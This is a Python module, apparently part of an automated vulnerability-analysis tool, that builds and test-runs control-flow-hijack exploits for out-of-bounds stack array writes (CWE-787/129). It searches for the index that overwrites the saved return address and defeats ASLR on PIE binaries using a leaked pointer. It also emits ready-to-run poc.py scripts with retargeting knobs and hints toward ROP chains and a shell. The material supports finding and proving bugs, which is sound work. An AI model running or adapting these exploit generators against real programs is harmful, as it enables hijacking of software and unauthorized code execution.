"""doc 58: construct a control-flow-hijack PoC for an unchecked-index STACK-array write (CWE-787/129).

The classic shape the menu-oriented chain_primitive._oob_write_hijack misses: a stack array
`arr[idx] = val` with an attacker-controlled index and a RAW (binary) read input. `arr_base +
idx*stride` lands on the saved return address -- a CONSTANT stack-relative offset, so the index is
ASLR-independent -- and `val = &win` redirects control when the function returns. We find the index
by a small neighborhood search and CONFIRM by detonation: the win breakpoint is hit with our value
AND a benign value does NOT hit it (so the overwrite, not incidental flow, caused arrival).

Non-PIE only (win is a file vaddr); a PIE indexed write needs a leak first (honest: left as a recipe).
"""
from __future__ import annotations

import logging
import struct

from ... import observe

_log = logging.getLogger(__name__)

#: element stride by C base type (the array index is scaled by this).
_ELEM = {"char": 1, "unsigned char": 1, "signed char": 1, "short": 2, "unsigned short": 2,
         "int": 4, "unsigned int": 4, "long": 8, "long int": 8, "unsigned long": 8,
         "long long": 8, "size_t": 8, "ssize_t": 8, "void *": 8}


def _stride(vartype: str) -> int:
    base = (vartype or "").split("[")[0].replace("*", "").strip()
    return _ELEM.get(base, 8)


def _buffer_var(frame):
    """The array buffer local in a frame (largest is_buffer var), or None."""
    if not frame:
        return None
    bufs = [v for v in (frame.get("vars") or []) if isinstance(v, dict) and v.get("is_buffer")
            and "[" in str(v.get("type", ""))]
    if not bufs:
        bufs = [v for v in (frame.get("vars") or []) if isinstance(v, dict) and v.get("is_buffer")]
    return max(bufs, key=lambda v: int(v.get("size") or 0)) if bufs else None


#: input encodings to try -- how the program reads the index and the value. Raw 8-byte LE words
#: (a read() of a binary struct) and decimal text (a scanf("%ld %ld")) are both common; a value
#: with NUL bytes (an address) only survives the text forms, so for PIE those rank naturally.
_ENCODINGS = [
    ("idx,val/raw", lambda i, v: struct.pack("<qq", i, v)),
    ("val,idx/raw", lambda i, v: struct.pack("<qq", v, i)),
    ("idx,val/text", lambda i, v: f"{i} {v}\n".encode()),
    ("val,idx/text", lambda i, v: f"{v} {i}\n".encode()),
]


def _candidate_indices(buf_off, stride):
    """The array indices whose write lands on the saved return address / saved rbp, from the
    buffer's rbp-relative offset (or a small default sweep when the frame is unknown)."""
    stride = stride if stride in (1, 2, 4, 8) else 8
    centres = set()
    for toff in (8, 0, 16):
        if buf_off is not None:
            centres.add((toff - buf_off) // stride)
    base = sorted(centres) or list(range(1, 20))
    cands = []
    for c in base:
        for d in (0, 1, -1, 2, -2, 3):
            if c + d not in cands and c + d > 0:
                cands.append(c + d)
    return cands


def _hijack(detonate, exe, buf_off, stride, win_addr, specs, scratch_dir):
    """Find the (channel, index, payload, encoding) that overwrites the saved return address with
    &win, confirmed by detonation + a negative control. `specs` is the ranked (mode, env_name) list
    of input channels to deliver on -- the raw index/value bytes are not always read from stdin.
    buf_off is the buffer's rbp-relative offset (negative); the return slot sits a few words above
    rbp. Returns a dict or None."""
    stride = stride if stride in (1, 2, 4, 8) else 8
    cands = _candidate_indices(buf_off, stride)
    for mode, env_name in specs:
        attempts = 0
        for idx in cands:
            for ename, enc in _ENCODINGS:
                if attempts >= 80:
                    break
                attempts += 1
                payload = enc(idx, win_addr)
                if not detonate.reaches_address(exe, payload, win_addr, input_mode=mode,
                                                env_name=env_name, scratch_dir=scratch_dir):
                    continue
                neg = enc(idx, win_addr ^ 0xFFFF)
                if detonate.reaches_address(exe, neg, win_addr, input_mode=mode,
                                            env_name=env_name, scratch_dir=scratch_dir):
                    continue                               # reached without our value -> incidental
                return {"idx": idx, "payload": payload, "enc": ename, "stride": stride,
                        "mode": mode, "env_name": env_name}
    return None


def _hijack_pie(detonate, exe, buf_off, stride, win_off, target_bytes):
    """PIE: there is no fixed win address -- defeat ASLR with the pointer the target discloses, then
    write `base + win_off` over the saved return. The two-stage runtime oracle recovers the base from
    the leak (exploit.recover_pie_base, ASLR-honest) and confirms control reaches base+win_off; a
    negative control (wrong value) must NOT reach. The index is stack-relative so it is the SAME as
    on a non-PIE build. Interactive stdin only (the leak and the write are sequential reads).
    Returns a dict {idx, enc, base, win_rt, stride} or None."""
    cands = _candidate_indices(buf_off, stride)
    attempts = 0
    for ename, enc in _ENCODINGS:
        for idx in cands:
            if attempts >= 120:
                return None
            attempts += 1
            mp = lambda base, win_rt, _e=enc, _i=idx: _e(_i, win_rt)
            reached, base = detonate.reaches_runtime_address(
                exe, win_off=win_off, target_bytes=target_bytes, make_payload=mp, timeout=6.0)
            if not reached or base is None:
                continue
            mpn = lambda base, win_rt, _e=enc, _i=idx: _e(_i, (win_rt ^ 0xFFFF))
            neg, _b = detonate.reaches_runtime_address(
                exe, win_off=win_off, target_bytes=target_bytes, make_payload=mpn, timeout=6.0)
            if neg:
                continue                                   # reached without our value -> incidental
            return {"idx": idx, "enc": ename, "base": int(base), "win_rt": int(base) + win_off,
                    "stride": stride}
    return None


def _capture_leak_offset(exe, target_bytes):
    """The file-offset of the symbol the target discloses: run it once, read the FIRST pointer it
    prints, and recover the base from THAT SAME run (the base is per-process, so it must come from
    the same process the pointer did). off = first_pointer - base is constant across runs (ASLR only
    shifts the base), so the two-stage builder maps a fresh leak back as `base = leaked - off`."""
    import re
    import subprocess
    from . import exploit as _exploit
    try:
        p = subprocess.run([exe], input=b"", capture_output=True, timeout=5.0)
        out = (p.stdout or b"") + (p.stderr or b"")
        vals = [int(m, 16) for m in re.findall(rb"0x([0-9a-fA-F]{6,})", out)]
        if not vals:
            return None
        base = _exploit.recover_pie_base(vals, target_bytes, allow_single=True)
        if base is None:
            return None
        for v in vals:                                     # the builder reads the FIRST pointer, so
            off = v - int(base)                            # prefer it; fall back to any image pointer
            if 0 <= off < 0x10000000:
                return off
        return None
    except Exception:                                      # noqa: BLE001
        return None


def _oob_pie_builder(binname, idx, win_off, win_name, enc, leak_off) -> list:
    """Two-stage PIE builder (the deliverable): read the disclosed pointer, recover the base, write
    base+win_off over the saved return at the unchecked index."""
    textenc = enc.endswith("text")
    if "val,idx" in enc:
        line = "f\"{WIN_RT} {WRITE_INDEX}\\n\"" if textenc else "struct.pack('<qq', WIN_RT, WRITE_INDEX)"
    else:
        line = "f\"{WRITE_INDEX} {WIN_RT}\\n\"" if textenc else "struct.pack('<qq', WRITE_INDEX, WIN_RT)"
    enc_bytes = ".encode()" if textenc else ""
    lo = leak_off if leak_off is not None else 0
    lo_disp = f"{leak_off:#x}" if leak_off is not None else "unknown -- set it to the file offset of the disclosed symbol"
    usage = (
        "WHAT IT IS — a two-stage PoC: it reads the pointer the program discloses, recovers the PIE "
        "base (defeating ASLR with the leak, not a guess), then writes base+win_off over the saved "
        "return via the unchecked index.\n"
        "WORKFLOW —\n"
        f"1. Download the builder (`poc.py`) below.\n"
        f"2. Run it against the target: `python3 poc.py ./{binname}` — it does both stages and the "
        "program's control transfers to the chosen address.\n"
        f"ON SOURCE — build the source first (e.g. `gcc -fPIE -pie -o {binname} src.c`), then run the "
        "builder on the compiled binary."
    )
    guide = (
        f"This PoC defeats ASLR on a PIE binary by consuming the pointer the program leaks, then "
        f"overwrites the saved return with `base + win_off` (= &{win_name}) via `arr[{idx}]`. Knobs:\n"
        f"- WIN_OFF ({win_off:#x}) — the image offset to jump to on return; set to ANY in-image "
        "offset (another function, a one-gadget once you also leak libc).\n"
        f"- WRITE_INDEX ({idx}) — the array index that lands on the saved return (stack-relative, so "
        "ASLR-independent; found by search + detonation).\n"
        f"- LEAK_OFF ({lo_disp}) — the file offset of the disclosed symbol; base = "
        "leaked_pointer - LEAK_OFF."
    )
    script = (
        "#!/usr/bin/env python3\n"
        "# Out-of-bounds indexed write -> control hijack on a PIE binary (defeats ASLR via the leak).\n"
        "import re, struct, subprocess, sys\n\n"
        f"WIN_OFF     = {win_off:#x}   # image offset of the target (&{win_name})\n"
        f"WRITE_INDEX = {idx}          # arr[WRITE_INDEX] lands on the saved return address\n"
        f"LEAK_OFF    = {lo:#x}   # file offset of the disclosed symbol; base = leaked - LEAK_OFF\n\n"
        f"exe = sys.argv[1] if len(sys.argv) > 1 else './{binname}'\n"
        "p = subprocess.Popen([exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n"
        "                     stderr=subprocess.STDOUT)\n"
        "line = p.stdout.readline()                      # stage 1: read the disclosed pointer\n"
        "m = re.search(rb'0x([0-9a-fA-F]+)', line)\n"
        "leaked = int(m.group(1), 16)\n"
        "base = leaked - LEAK_OFF\n"
        "WIN_RT = base + WIN_OFF\n"
        f"p.stdin.write(({line}){enc_bytes}); p.stdin.flush()   # stage 2: write base+win_off\n"
        "sys.stdout.buffer.write(p.stdout.read())\n"
        f"# run:  python3 poc.py ./{binname}\n"
    )
    return [{"channel": "builder-usage", "detail": usage},
            {"channel": "customize", "detail": guide},
            {"channel": "exploit-script", "detail": script}]


def _oob_builder(binname, idx, win_addr, win_name, enc, mode="stdin", env_name=None) -> list:
    """The retarget knobs + an editable builder for the oob-index-write, as evidence channels."""
    from . import channels
    deliver = channels.deliver_line(mode, binname, env_name)
    where = channels.channel_phrase(mode, env_name)
    order = "struct.pack('<qq', WRITE_INDEX, WRITE_VALUE)" if enc == "idx,val" \
        else "struct.pack('<qq', WRITE_VALUE, WRITE_INDEX)"
    usage = (
        "WHAT IT IS — a tiny builder: it emits the raw bytes (index + value) the program reads, "
        "which overwrite the saved return address.\n"
        "WORKFLOW —\n"
        "1. Download the builder (`poc.py`) below.\n"
        "2. Build the payload: `python3 poc.py > poc.bin`.\n"
        f"3. Deliver it (via {where}): `{deliver}` — control transfers to the chosen address.\n"
        f"ON SOURCE — build the source first (e.g. `gcc -o {binname} src.c`), then run the builder on "
        "the compiled binary. The Memory layout shows the array vs the return address."
    )
    guide = (
        f"This PoC overwrites the saved return address via the unchecked index: `arr[{idx}] = &{win_name}` "
        f"({win_addr:#x}). Edit these knobs in the builder below:\n"
        f"- WRITE VALUE ({win_addr:#x}) — where control jumps on return; set it to ANY function's address.\n"
        f"- WRITE INDEX ({idx}) — the array index that lands on the return slot (found by search + "
        "detonation; stable for this binary).\n"
        "- RCE / shell — a single 8-byte write to the return address reaches a one-gadget directly; "
        "for a full shell, chain writes to lay a short ROP chain (pop rdi; &\"/bin/sh\"; system)."
    )
    script = (
        "#!/usr/bin/env python3\n"
        "# Out-of-bounds (unchecked-index) write -> control hijack. EDIT to retarget.\n"
        "import struct, sys\n\n"
        f"WRITE_INDEX = {idx}          # arr[WRITE_INDEX] lands on the saved return address\n"
        f"WRITE_VALUE = {win_addr:#x}   # where control jumps -- set to ANY function's address\n\n"
        f"sys.stdout.buffer.write({order})\n"
        f"# run:  python3 poc.py > poc.bin ;  {deliver}\n"
    )
    return [{"channel": "builder-usage", "detail": usage},
            {"channel": "customize", "detail": guide},
            {"channel": "exploit-script", "detail": script}]


def construct_stack_oob_writes(ctx, target) -> list:
    """For each CWE-787/129 unchecked-index write whose function has a stack array, construct and
    DETONATE a return-address overwrite to win -> a poc-backed L3. Returns the filed finding ids."""
    from ...db.dao import FindingDAO, FunctionDAO
    from . import channels, construct, detonate, elfstatic, exploit
    fids = []
    try:
        tb = ctx.content.path(target.sha256).read_bytes()
        is_pie = elfstatic.is_pie(tb)
        win = exploit.find_win(exploit.elf_functions(tb))
        if not (win and win[1]):
            return []
        win_name, win_addr = win[0], int(win[1])   # for PIE win_addr is the image OFFSET
        fd = FindingDAO(ctx.conn)
        leads = [f for f in fd.list_by_target(target.id)
                 if f.cwe in ("CWE-129", "CWE-787") and f.function_addr
                 and not (f.dedup_key or "").startswith("poc:")]
        if not leads:
            return []
        if any((f.dedup_key or "").startswith("poc:CWE-787:oob-write:") for f in fd.list_by_target(target.id)):
            return []                                      # already constructed
        # stage the binary (content store is non-exec)
        staged = ctx.scratch() / "oob-construct" / (getattr(target, "filename", None) or "target.bin")
        staged.parent.mkdir(parents=True, exist_ok=True)
        ctx.content.stage_target(target, staged.parent, staged.name)
        staged.chmod(0o755)
        exe = str(staged)
        scratch_dir = str(staged.parent)
        specs = channels.delivery_specs(ctx, target)
        fnd = FunctionDAO(ctx.conn)
        done_fn = set()
        for lead in leads:
            fa = lead.function_addr
            if fa in done_fn:
                continue
            done_fn.add(fa)
            frame = _frame_at(fnd, target.id, fa)
            bv = _buffer_var(frame)
            buf_off = int(bv["offset"]) if bv and bv.get("offset") is not None else None
            stride = _stride(bv.get("type")) if bv else 8
            if is_pie:
                fid = _construct_pie(ctx, target, detonate, exploit, exe, buf_off, stride,
                                     win_name, win_addr, tb, lead, fa)
                if fid:
                    fids.append(fid)
                continue
            res = _hijack(detonate, exe, buf_off, stride, win_addr, specs, scratch_dir)
            if not res:
                continue
            idx, payload = res["idx"], res["payload"]
            mode, env_name = res["mode"], res["env_name"]
            binname = getattr(target, "filename", None) or "./target"
            where = channels.channel_phrase(mode, env_name)
            deliver = channels.deliver_line(mode, binname, env_name)
            soundness = [
                "unchecked array index: arr[idx] = value writes outside the array with no bound "
                "check on idx (the CWE-787/129 site)",
                f"the index and value are read from {where}",
                f"index {idx} overwrites the saved return address: arr_base + {idx}*{res['stride']} "
                "lands on the return slot -- a constant stack-relative offset, ASLR-independent",
                f"value = &{win_name} ({win_addr:#x}) -- control redirects to {win_name} on return",
                "no stack canary: an indexed stack write to the return address is not guarded",
                f"DETONATED: control reached {win_name} ({win_addr:#x}) with this value; a benign "
                "value does NOT reach it (the overwrite, not incidental flow, caused arrival)",
            ]
            reproduce = (
                f"# CWE-787 out-of-bounds write -> control hijack ({win_name})\n"
                f"# arr[{idx}] = &{win_name} ({win_addr:#x}) overwrites the saved return address.\n"
                f"# payload = raw bytes ({len(payload)}) read from {where}; the attached poc-input "
                "artifact. save as poc.bin\n"
                f"{deliver}"
            )
            fid = construct.record_constructed_poc(
                ctx, target, cwe="CWE-787",
                technique="oob-index-write -> return-address overwrite", level="L3",
                payload=payload, soundness=soundness, reproduce=reproduce, input_mode=mode,
                detector="oob_construct", dedup_key=f"poc:CWE-787:oob-write:{fa}:{target.id}",
                title=f"Out-of-bounds write -> control hijack ({win_name}) at {fa}",
                summary=f"arr[{idx}] := &{win_name} ({win_addr:#x}) over the saved return address "
                        f"(index/value via {where}); control reach confirmed by detonation",
                lead=lead, detonated=True,
                signal_name=f"control reached {win_name} ({win_addr:#x})",
                function_addr=fa, site_addr=lead.site_addr,
                extra_evidence=_oob_builder(binname, idx, win_addr, win_name, res["enc"],
                                            mode, env_name))
            if fid:
                fids.append(fid)
    except Exception:                                      # noqa: BLE001 -- best-effort
        observe.absorbed(_log, "stack-oob construct failed")
    return fids


def _construct_pie(ctx, target, detonate, exploit, exe, buf_off, stride, win_name, win_off, tb,
                   lead, fa):
    """PIE oob -> L3 by consuming the disclosed pointer (defeat ASLR) and writing base+win_off over
    the saved return. Files a poc-backed L3 on a confirmed two-stage hijack, else None (honest: no
    pointer disclosure => no base => no sound PIE exploit, so nothing is filed)."""
    from . import construct
    res = _hijack_pie(detonate, exe, buf_off, stride, win_off, tb)
    if not res:
        return None
    idx, base, win_rt = res["idx"], res["base"], res["win_rt"]
    leak_off = _capture_leak_offset(exe, tb)
    binname = getattr(target, "filename", None) or "./target"
    soundness = [
        "unchecked array index: arr[idx] = value writes outside the array with no bound check on "
        "idx (the CWE-787/129 site)",
        "the index and value are read from standard input (the leak and the write are sequential "
        "reads on the same interactive channel)",
        f"the target DISCLOSES an image pointer; its page offset matches &{win_name}'s segment, so "
        f"the PIE base is recovered from the leak alone (ASLR-honest, no address guessed)",
        f"index {idx} overwrites the saved return: arr_base + {idx}*{res['stride']} lands on the "
        "return slot -- a constant stack-relative offset, ASLR-independent",
        f"value = base + win_off ({win_off:#x}) = &{win_name} at its RUNTIME address -- control "
        "redirects there on return",
        "no stack canary: an indexed stack write to the return address is not guarded",
        f"DETONATED: control reached {win_name} at its runtime address (base {base:#x} recovered "
        "from the leak); a benign value does NOT reach it (the overwrite, not incidental flow, "
        "caused arrival)",
    ]
    reproduce = (
        f"# CWE-787 out-of-bounds write -> control hijack on a PIE binary ({win_name})\n"
        "# two stages: (1) read the leaked pointer -> recover the PIE base; (2) write base+win_off\n"
        f"#            over the saved return via arr[{idx}]. Defeats ASLR with the leak, not a guess.\n"
        f"# the attached poc.py does both stages:\n"
        f"python3 poc.py {binname}"
    )
    evidence = _oob_pie_builder(binname, idx, win_off, win_name, res["enc"], leak_off)
    script = next((e["detail"] for e in evidence if e["channel"] == "exploit-script"), "")
    return construct.record_constructed_poc(
        ctx, target, cwe="CWE-787",
        technique="oob-index-write -> return-address overwrite (PIE, leak-defeats-ASLR)", level="L3",
        payload=script.encode(), soundness=soundness, reproduce=reproduce, input_mode="stdin",
        detector="oob_construct", dedup_key=f"poc:CWE-787:oob-write:{fa}:{target.id}",
        title=f"Out-of-bounds write -> control hijack ({win_name}, PIE) at {fa}",
        summary=f"arr[{idx}] := base+win_off (&{win_name}) over the saved return on a PIE binary; "
                "PIE base recovered from the disclosed pointer; control reach confirmed by detonation",
        lead=lead, detonated=True,
        signal_name=f"control reached {win_name} at runtime (base {base:#x} from leak)",
        function_addr=fa, site_addr=lead.site_addr, extra_evidence=evidence)


def _frame_at(fnd, target_id, faddr):
    try:
        want = int(faddr, 16) if isinstance(faddr, str) else int(faddr)
    except (TypeError, ValueError):
        return None
    for f in fnd.list_by_target(target_id):
        try:
            a = int(f.addr, 16) if isinstance(f.addr, str) else int(f.addr)
        except (TypeError, ValueError):
            continue
        if a == want:
            full = fnd.get(f.id)
            return getattr(full, "frame", None) if full else None
    return None
